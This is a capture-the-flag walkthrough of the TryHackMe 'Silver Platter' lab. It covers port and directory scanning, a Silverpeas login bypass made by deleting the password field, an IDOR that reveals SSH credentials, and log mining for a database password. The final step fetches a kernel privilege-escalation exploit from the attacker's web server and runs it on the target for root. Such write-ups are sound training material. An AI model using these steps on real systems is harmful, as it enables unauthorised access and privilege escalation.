# Silver Platter — TryHackMe

## 1. Reconnaissance

### Nmap

We start with a standard service scan.


```BASH
sudo nmap -sV -sS 10.114.146.144

Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-27 09:06 EDT
Nmap scan report for 10.114.146.144
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
8080/tcp open  http-proxy
```

Three ports are open. The main point of interest is port 8080, although I didn't realize that immediately.

### Nuclei

Next, we run Nuclei to search for known vulnerabilities.


```BASH
nuclei -u 10.114.146.144 -severity low,medium,high,critical -o nuclei_results.txt

[CVE-2023-48795] [javascript] [medium] 10.114.146.144:22 ["Vulnerable to Terrapin"]
[INF] Scan completed in 1m. 1 matches found.
```

The only vulnerability detected is Terrapin (CVE-2023-48795) on SSH. It is not particularly useful for our further progress.

## 2. SSH Brute Force (Unsuccessful)

I attempted to brute-force SSH using Metasploit.


```
# Module: auxiliary/scanner/ssh/ssh_login
# Username: scr1ptkiddy h4x0r (static)
# Passwords: /home/deb88/HH101/seclists/Passwords/Leaked-Databases/rockyou-75.txt
```

Methodology: [https://medium.com/@zendpushkar/ssh-exploitation-brute-force-attack-and-privilege-escalation-e0772c64a77d](https://medium.com/@zendpushkar/ssh-exploitation-brute-force-attack-and-privilege-escalation-e0772c64a77d) 

The brute-force attempt was unsuccessful. I then remembered the open port 8080.

## 3. Discovery

### Gobuster on Port 8080

We run Gobuster against port 8080 to discover hidden directories.

```BASH
gobuster dir -u 10.112.155.196:8080 -w /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt -x php,html,txt

/console              (Status: 302) [Size: 0] [--> /noredirect.html]
/website              (Status: 302) [Size: 0] [--> http://10.112.155.196:8080/website/]
Progress: 19008 / 19008 (100.00%)
```

In the `#contact` section, I discover that Silverpeas is the name of the software, not the room itself.

### Searching for an Exploit

I accidentally came across the following exploit while searching for Silverpeas CVEs:

[https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47320](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47320) 

At this point, I realized that port 8080 had something much more interesting running on it.

### Gobuster on `/silverpeas`

We run Gobuster against the Silverpeas directory.

```BASH
gobuster dir -u http://10.112.155.196:8080/silverpeas -w /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt -x php,html,txt
```

Key findings:

```
/Login                (Status: 302) [Size: 0] [--> http://10.112.155.196:8080/silverpeas/defaultLogin.jsp]
/Main                 (Status: 302) [Size: 0] [--> http://10.112.155.196:8080/silverpeas/admin/jsp/silverpeas-main.jsp]
/admin                (Status: 302) [Size: 0] [--> http://10.112.155.196:8080/silverpeas/admin/]
/dt                   (Status: 200) [Size: 548]
/proxy                (Status: 200) [Size: 548]
/j_security_check     (Status: 500) [Size: 842]
/sso                  (Status: 302) [Size: 0] [--> http://10.112.155.196:8080/silverpeas/Login?ErrorCode=2&DomainId=-1]
... (many other paths)
Progress: 81924 / 81928 (100.00%)
```

The login page is located at:

```
/silverpeas/defaultLogin.jsp
```

However, as it turns out, the interesting part lies elsewhere.

## 4. Authentication Bypass

We intercept the login request using Caido.

The original request contains both a username and a password. We completely remove the password parameter, leaving only:

```
Login=scr1ptkiddy&DomainId=0
```

After sending this modified request, we gain access to the application:

```
http://10.112.171.255:8080/silverpeas/look/jsp/MainFrame.jsp#
```

We have successfully logged in as `scr1ptkiddy` without providing a password.

## 5. IDOR — Reading Another User's Messages

Inside the messaging module (Silvermail), we modify the message ID in the request to `6`.


```HTTP
GET /silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6 HTTP/1.1
```

The message contains the following information:

```
Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 

Username: tim
Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

We have obtained the SSH credentials for the user `tim`.

## 6. User Flag

We use the credentials to connect to the machine via SSH.


```BASH
ssh tim@10.xxx.xxx.xxx
# Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

After logging in, we retrieve the user flag.

```BASH
cat user.txt
THM{c4ca4238a0b923820dcc509a6f75849b}
```

Next, we check our current privileges.


```BASH
id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

The `tim` user is a member of the `adm` group, which grants access to certain system logs.

## 7. Privilege and Log Analysis

First, we check the account of another user, `tyler`.

```BASH
grep tyler /etc/passwd
tyler:x:1000:1000:root:/home/tyler:/bin/bash
```

We also inspect the groups:

```BASH
# Groups
adm:x:4:syslog,tyler,tim,ubuntu
sudo:x:27:tyler,ubuntu
docker:x:119:
```

The `tyler` user has sudo privileges and belongs to the `docker` group. We need access to this account. This was probably the intended path, but I managed to complete the room another way.

### Docker Logs

Since the `adm` group can access system logs, we inspect `/var/log`.

We find the following entries:

```
/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
```

We extract the following credentials:

* `DB_NAME=Silverpeas`

* `DB_USER=silverpeas`

* `DB_PASSWORD=_Zd_zx7N823/`

This confirms that Silverpeas is running inside a Docker container.

### SUID Binaries

We also search for SUID binaries.


```BASH
find / -perm -4000 -type f 2>/dev/null
```

The results include:

```
/snap/core20/2264/usr/bin/chfn
/snap/core20/2264/usr/bin/chsh
...
/usr/bin/sudo
/usr/bin/su
/usr/bin/pkexec
...
```

These are standard SUID binaries. Nothing unusual stands out.

## 8. Privilege Escalation — Copy Fail (CVE-2026-31431)

During the system enumeration, LinPEAS detects a vulnerability known as Copy Fail.

```
╔══════════╣ Checking for Copy Fail (CVE-2026-31431) (T1068)
╚ https://copy.fail/
╚ https://www.cve.org/CVERecord?id=CVE-2026-31431
VULNERABLE: non-destructive AF_ALG/splice page-cache write triggered
```

The exploit is available here:

[https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py) 

### Exploitation

On the attacking machine, we start a temporary HTTP server.


```BASH
sudo python3 -m http.server 80
```

On the target machine, we download and execute the exploit.


```BASH
tim@ip-10-113-135-146:/tmp$ wget http://192.168.154.82/copy_fail_exp.py
python3 copy_fail_exp.py
```

After successful execution, we check our privileges.

```BASH
# id
uid=0(root) gid=1001(tim) groups=1001(tim),4(adm)
```

We now have root privileges.

Next, we navigate to `/root` and retrieve the root flag.


```BASH
cat /root/root.txt
THM{098f6bcd4621d373cade4e832627b4f6}
```

## 9. How the Copy Fail Exploit Works

CVE-2026-31431 is a vulnerability in the Linux kernel involving the `AF_ALG` interface and `splice`.

It allows an attacker to perform a non-destructive write to the page cache.

The exploit takes advantage of this behavior to overwrite privileged structures or memory pages and obtain root privileges. This is classified as T1068 — Exploitation for Privilege Escalation.

More details and the exploit code:

* [https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py) 

* [https://copy.fail/](https://copy.fail/) 

## 10. Useful Resources

* [SSH Brute Force and Privilege Escalation](https://medium.com/@zendpushkar/ssh-exploitation-brute-force-attack-and-privilege-escalation-e0772c64a77d) 

* [CVE-2023-47320 — Rhino Security Labs](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47320) 

* [HackTricks — Linux Privilege Escalation](https://hacktricks-training.com/courses/lhe/) 

* [HackTricks — Linux Privilege Escalation Checklist](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html) 

* [Copy Fail](https://copy.fail/) 

* [CVE-2026-31431 — CVE Record](https://www.cve.org/CVERecord?id=CVE-2026-31431) 

* [Copy Fail Exploit — GitHub](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py) 


## Exploitation Chain

Nmap → Nuclei → Gobuster → Authentication Bypass (removing the password parameter) → IDOR in Silvermail → SSH as `tim` → Log Analysis (`adm`) → LinPEAS → Copy Fail Exploit → Root.

After reading other writeups, I discovered that the intended path was much more straightforward.

The `tyler` user's password was the same as the PostgreSQL database password:

```
POSTGRES_PASSWORD=_Zd_zx7N823/
```

With this password, we could switch to the `tyler` account using:
```BASH
su tyler
```

After gaining access to `tyler`, we could use the privileges associated with that account to access the `/root` directory and retrieve the root flag.
